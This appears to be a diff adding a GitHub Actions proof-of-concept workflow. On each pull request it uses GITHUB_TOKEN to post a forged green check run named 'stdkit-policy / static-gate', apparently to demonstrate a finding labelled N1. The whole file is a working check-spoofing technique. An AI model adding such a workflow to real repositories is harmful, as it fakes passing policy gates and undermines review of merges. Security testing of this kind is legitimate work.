@@ -1,0 +1,29 @@
+name: Rogue Same-Repo Forge Test
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  checks: write
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge green stdkit-policy / static-gate check run with GITHUB_TOKEN
+        shell: bash
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          sleep 8
+          gh api --method POST "/repos/${{ github.repository }}/check-runs" \
+            -f name="stdkit-policy / static-gate" \
+            -f head_sha="${{ github.event.pull_request.head.sha }}" \
+            -f status="completed" \
+            -f conclusion="success" \
+            -f "output[title]=FORGED by same-repo PR workflow via GITHUB_TOKEN" \
+            -f "output[summary]=Proves N1: PR workflow using GITHUB_TOKEN can post a green check run with the exact same name and GitHub Actions app identity." \
+            | jq "{id, name, status, conclusion, app: {id: .app.id, slug: .app.slug, name: .app.name}}"
